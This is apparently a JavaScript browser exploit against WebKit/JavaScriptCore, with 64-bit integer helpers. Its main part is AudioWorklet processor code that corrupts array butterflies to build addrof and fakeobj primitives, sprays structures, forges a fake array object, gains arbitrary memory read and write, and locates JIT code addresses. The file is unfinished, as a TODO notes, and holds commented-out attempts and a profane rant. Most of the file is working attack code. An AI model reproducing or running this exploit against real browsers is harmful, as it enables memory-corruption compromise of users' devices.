//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß 
//

// Display alert message
function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            
            return false;
        }
    }
    return fn(str.length) == 0;
}

function delay(ms = 1000){
    var t1 = Date.now();
    while(Date.now() - t1 <= ms){

    }
}

function print(s){
    alert(s);
}

// Return the hexadecimal representation of the given byte.
function hex(b,c) {
    if (c) {
    if (b < 0)
        return `-${hex(-b)}`
    return `0x${b.toString(16)}`
    } else {
    return ('0' + b.toString(16)).substr(-2);
    }
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);
    var u32 = new Uint32Array(2);
    this.bytes = bytes;

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.getBytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x2000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x2000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.getBytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };
    
    this.lo = function()
    {
        //let hex = hex1()
        u32[0] = this;
    var b = Array.from(u32);
    //alert(hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true))
    return hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true);
    };

    this.hi = function()
    {
        //let hex = hex1()
        u32[0] = this;
var b = Array.from(u32);
return hex((b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0,true);
    };
    
    this.asInt32 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 4) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };
    
    this.asInt16 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 2) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a ^ b
    this.assignXor = operation(function xor(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a << b
    this.assignShiftLeft = operation(function shiftLeft(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < b) {
                bytes[i] = 0;
            } else {
                bytes[i] = a.byteAt(Sub(i, b).asInt32());
            }
        }
        return this;
    }, 2);
    
    // this = a >> b
    this.assignShiftRight = operation(function shiftRight(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < (8 - b)) {
                bytes[i] = a.byteAt(Add(i, b).asInt32());
            } else {
                bytes[i] = 0;
            }
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

// Return a << b
function ShiftLeft(a, b) {
    return (new Int64()).assignShiftLeft(a, b);
}

// Return a >> b
function ShiftRight(a, b) {
    return (new Int64()).assignShiftRight(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

function iv(x){
    return new Int64(x).asJSValue();
}

// That's all the arithmetic we need for exploiting WebKit.. :)







let data_view = new DataView(new ArrayBuffer(8));
var floatAsQword = float => {
    data_view.setFloat64(0, float, true);
    var low = data_view.getUint32(0, true);
    var high = data_view.getUint32(4, true);
    return low + (high * 0x100000000);
}
var qwordAsTagged = qword =>{
    return qwordAsFloat( qword- 0x0002000000000000);
}
var qwordAsFloat = qword => {
    data_view.setUint32(0, qword%0x100000000, true);
    data_view.setUint32(4, qword/0x100000000, true);
    //data_view.setBigUint64(0, qword);
    return data_view.getFloat64(0, true);
}
var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
var VM_PROT_NONE = 0x0
var VM_PROT_READ = 0x1
var VM_PROT_WRITE = 0x2
var VM_PROT_EXECUTE = 0x4

// constant added to double JSValues
          const kBoxedDoubleOffset = 0x0002000000000000n;
          function boxDouble(d) {
            return d - kBoxedDoubleOffset;
          }
          function unboxDouble(d) {
            return d - kBoxedDoubleOffset;
          }
          // the structure ID is wrong, but we'll fix it :)
          let doubleArrayCellHeader = 0x0108230700000000n;
          let f = new Float64Array(1);
          let u = new Uint32Array(f.buffer);
          function float2bigint(v,set) {
          if (set) {
          f[0] = v;
          return "0x"+(u[0] | u[1] << 32).toString(16);
          }
            f[0] = v;
            return BigInt(u[0]) | (BigInt(u[1]) << 32n);
          }
          function bigint2float(v,set) {
            if(set) {
            u[0] = Number(v & 0xffffffff)
            u[1] = Number(v >> 32);
            return f[0]
            }
            u[0] = Number(v & 0xffffffffn);
            u[1] = Number(v >> 32n);
            return f[0];
          }
          // store things to prevent GC
          let keep = [];
          function gc(n=10000) {
            let tmp = [];
            for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
          }
          // message port to talk to main thread; will be set later
          let port = null;
          // will be implemented later
          let fakeobj = null;
          let addrof = null;
          for (var i = 0; i < 100; i++) keep.push([1.1*i]);
          let a0 = [0,0,0,0,0,0,0,0,0,0];
          let a1 = [0,0,0,0,0,0,0,0,0,0];
          // transition to unboxed double storage
          a1[3] = 13.37;
          let b0 = [0,0,0,0,0,0,0,0,0,0];
          let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
          // put zeroes in first two slots so JSCallbackData destruction is safe
          delete b1[0];
          delete b1[1];
          function setupPrimitives() {
            port.postMessage("setting up");
            if (a1.length != 0x1337) {
              port.postMessage("Failure on array length");
              return;
            }
            const kSentinel = 1333.337;
              //var kSentinel = 1333.337;
            let offset = -1;
            b1[0] = kSentinel;
            // scan for the sentinel to find the offset from a to b
            for (var i = 0; i < 0x100; i++) {
                //port.postMessage(new Int64.fromDouble(unboxDouble(new Int64(a1[i]).asDouble())))
              if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
                offset = i;
                break;
              }
            }
            if (offset == -1) {
              port.postMessage("Failure finding offset");
              return;
            }
            // temporary implementations
            addrof = (val) => {
              b1[0] = val;
              return new Int64.fromDouble(a1[offset]);
            }
            fakeobj = (addr) => {
              a1[offset] = new Int64(addr).asDouble();
              return b1[0];
            }
            /*hope we dont crash or have a gc from here on out...
            let obj = {
              jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
              fakeButterfly: a0
            };
            
            let addr = addrof(obj);
            port.postMessage("obj @ " + addr.toString());
            port.postMessage(typeof(addr) +"vs"+typeof(new Int64("0x10")))
           
            let fakeArr = fakeobj(Add(addr,new Int64("0x10"))); //no way around this im forced to use bigint for fakeobj :(
            // subtract off the incref
            doubleArrayCellHeader = Sub(Int64.fromDouble(fakeArr[0]),new Int64("0x1"));
            port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
            // fix broken cell header
            fakeArr[0] = new Int64(doubleArrayCellHeader).asDouble();
            // grab a real butterfly pointer
            let doubleArrayButterfly = new Int64.fromDouble(fakeArr[1]);
            // fix other broken cell header
            obj.fakeButterfly = b0;
            fakeArr[0] = new Int64(doubleArrayCellHeader).asDouble();
            // fix the broken butterflys and setup cleaner addrof / fakeobj
            obj.jsCellHeader = new Int64(doubleArrayCellHeader).asDouble();
            obj.fakeButterfly = a1;
            fakeArr[1] = new Int64(doubleArrayButterfly).asDouble();
            obj.fakeButterfly = b1;
            fakeArr[1] = new Int64(doubleArrayButterfly).asDouble();
            fakeobj = (addr) => {
              a1[0] = new Int64(addr).asDouble();
              return b1[0];
            }
            addrof = (val) => {
              b1[0] = val;
              return new Int64.fromDouble(a1[0]);
            }
            */
            port.postMessage("We got stableish addrof and fakeobj");
            
          }
          

          function arbrw() {
              var print = (msg) => {
                  port.postMessage(msg)
              };
              // from saelo: spray structures to be able to predict their IDs.
    // from Auxy: I am not sure about why spraying. i change the code to:
    //
    // var structs = []
    // var i = 0;
    // var abc = [13.37];
    // abc.pointer = 1234;
    // abc['prop' + i] = 13.37;
    // structs.push(abc);
    // var victim = structs[0];
    //
    // and the payload still work stablely. It seems this action is redundant
    var structs = []
    for (var i = 0; i < 0x1000; ++i) {
        var array = [13.37];
        array.pointer = 1234;
        array['prop' + i] = 13.37;
        structs.push(array);
    }
              var victim = structs[0x800];
              /*var structs = [];
              var i = 0;
              var abc = [13.37];
              abc.pointer = 1234;
              abc['prop' + i] = 13.37;
              structs.push(abc);
              var victim = structs[0];*/

    // take an array from somewhere in the middle so it is preceeded by non-null bytes which
    // will later be treated as the butterfly length.
    
    print(`[+] victim @ ${addrof(victim)}`);

    // craft a fake object to modify victim
    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
    var container = {
        header: flags_double_array,
        butterfly: victim
    };

    // create object having |victim| as butterfly.
    var containerAddr = addrof(container);
    print(`[+] container @ ${containerAddr}`);
    // add the offset to let compiler recognize fake structure
    var hax = fakeobj(Add(containerAddr, 0x10));
    var maxtry = 0;
    if (hax instanceof Array) {
            print("got fakeobj with real struct id");
            //continue;
        } else {
            while (!(hax instanceof Array)) {
            flags_double_array = Add(flags_double_array, Int64.One);
            container.header = flags_double_array;
            maxtry++;
            if (maxtry == 100000)
            {
              print("wow 10000 tries on getting valid structid failed!!!");
            }
            }
        }
    // origButterfly is now based on the offset of **victim** 
    // because it becomes the new butterfly pointer
    // and hax[1] === victim.pointer
    var origButterfly = hax[1];

    var memory = {
        addrof: addrof,
        fakeobj: fakeobj,

        // Write an int64 to the given address.
        writeInt64: function(addr, int64) {
            hax[1] = Add(addr, new Int64(0x10)).asDouble();
            victim.pointer = int64;
        },

        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
        write16: function(addr, value) {
            // Set butterfly of victim object and dereference.
            hax[1] = Add(addr, new Int64(0x10)).asDouble();
            victim.pointer = value;
        },

        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
        write: function(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i < ints.length; i++)
                this.write16(Add(addr, 2 * i), ints[i]);
        },

        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
        read64: function(addr) {
            // Set butterfly of victim object and dereference.
            hax[1] = Add(addr, new Int64(0x10)).asDouble();
            //return this.addrof(victim.pointer);
            return this.addrof(victim.pointer);
        },
        read: function(addr, length) {
            var a = new Array(length);
            var i;

            for (i = 0; i + 8 < length; i += 8) {
                v = this.read64(addr + i).bytes()
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = this.read64(addr + i).bytes()
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a
        },
        read_i64: function(addr) {
            return new Int64(this.read64(addr));
        },
    };

    // Testing code, not related to exploit
    var plainObj = {};
    var header = memory.read64(addrof(plainObj));
    memory.writeInt64(memory.addrof(container), header);
    //memory.test();
    //let memory.read_i64 = memory.read64;
     
    print("[+] arbitrary memory read/write working");
        var log = print;
        //never tried this method...
        //const audioCtx = new AudioContext();

        /*var d = new AudioWorkletProcessor();
        log('[*] Creating the HTMLDivElement wrapper...');
        //var d = oscillator;
        let ad_div = addrof(d);
        log('[+] Address of the div is '+ad_div.toString(16));
        //alert(FPO)
        let exe_ptr = memory.read_i64(Add(ad_div, FPO));
        log('[+] Executable instance is at '+exe_ptr.toString(16));
        let v_tlb = memory.read_i64(exe_ptr);
        log('[+] Oscillator vtable seems to be at '+v_tlb.toString(16));
        var anchor = memory.read_i64(v_tlb)
        var hdr = Sub(anchor, anchor.lo() & 0xfff);
        log('Webcore header @' + hdr); //dyld_cache_header
        */ //this wont be viable in our context as we can't access DOM Objects from a webworker dialect RIP.
        function makeJITCompiledFunction() {
    var obj = {};
    // Some code to avoid inlining...
    function target(num) {
      num ^= Math.random() * 10000;
      num ^= 0x70000001;
      num ^= Math.random() * 10000;
      num ^= 0x70000002;
      num ^= Math.random() * 10000;
      num ^= 0x70000003;
      num ^= Math.random() * 10000;
      num ^= 0x70000004;
      num ^= Math.random() * 10000;
      num ^= 0x70000005;
      num ^= Math.random() * 10000;
      num ^= 0x70000006;
      num ^= Math.random() * 10000;
      num ^= 0x70000007;
      num ^= Math.random() * 10000;
      num ^= 0x70000008;
      num ^= Math.random() * 10000;
      num ^= 0x70000009;
      num ^= Math.random() * 10000;
      num ^= 0x7000000a;
      num ^= Math.random() * 10000;
      num ^= 0x7000000b;
      num ^= Math.random() * 10000;
      num ^= 0x7000000c;
      num ^= Math.random() * 10000;
      num ^= 0x7000000d;
      num ^= Math.random() * 10000;
      num ^= 0x7000000e;
      num ^= Math.random() * 10000;
      num ^= 0x7000000f;
      num ^= Math.random() * 10000;
      num ^= 0x70000010;
      num ^= Math.random() * 10000;
      num ^= 0x70000011;
      num ^= Math.random() * 10000;
      num ^= 0x70000012;
      num ^= Math.random() * 10000;
      num ^= 0x70000013;
      num ^= Math.random() * 10000;
      num ^= 0x70000014;
      num ^= Math.random() * 10000;
      num ^= 0x70000015;
      num ^= Math.random() * 10000;
      num ^= 0x70000016;
      num ^= Math.random() * 10000;
      num ^= 0x70000017;
      num ^= Math.random() * 10000;
      num ^= 0x70000018;
      num ^= Math.random() * 10000;
      num ^= 0x70000019;
      num ^= Math.random() * 10000;
      num ^= 0x7000001a;
      num ^= Math.random() * 10000;
      num ^= 0x7000001b;
      num ^= Math.random() * 10000;
      num ^= 0x7000001c;
      num ^= Math.random() * 10000;
      num ^= 0x7000001d;
      num ^= Math.random() * 10000;
      num ^= 0x7000001e;
      num ^= Math.random() * 10000;
      num ^= 0x7000001f;
      num ^= Math.random() * 10000;
      num ^= 0x70000020;
      num ^= Math.random() * 10000;
      num &= 0xffff;
      return num;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    return target;
  }
    var funcAddr = memory.addrof(makeJITCompiledFunction());
    print("[+] JIT function @ " + funcAddr.toString());
    var executableAddr = memory.read64(Add(funcAddr, 3 * 8));
    print("[+] Executable instance @ " + executableAddr.toString());

    var jitCodeAddr = memory.read64(Add(executableAddr, 3 * 8));
    print("[+] JITCode instance @ " + jitCodeAddr.toString());
    var anchor = memory.read64(jitCodeAddr);
    print("JavaScriptCore instance @" + anchor);
              

        /*while(true)
        {
        FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
        if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
        //webcore header magic...
        {
            alert1(String.fromCharCode(...memory.read(hdr, 0x10)))
            break;
        }
        hdr = Sub(hdr, new Int64(0x1000));
        }
        log("dyld shared cache header @" + hdr);*/
        }
          function pwn() {
            try {
              setupPrimitives();

              // ensure we can survive GC
              gc();

              // TODO: rest of exploit goes here
              arbrw();
              port.postMessage("done!");
            } catch(e) { // send exception strings to main thread (for debugging)
              port.postMessage("Exception!!");
              port.postMessage(e.toString());
            }
          }

          registerProcessor("a", class {
            constructor() {
              // setup a message port to the main thread
              port = new AudioWorkletProcessor().port;
              port.onmessage = pwn;

              // this part is magic
              // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
              eval('1 + 0x1336');

              // overwrite a1's butterfly with a fastMalloc pointer
              return {fill: 1, a: a0};
            }
          });
          registerProcessor("b", class {
            constructor() {
              // overwrite b1's butterfly with a fastMalloc pointer
              return {fill: 1, b: b0};
                
            }
            /*var div = (e) => {
              var d = e;
              
          }*/
          });
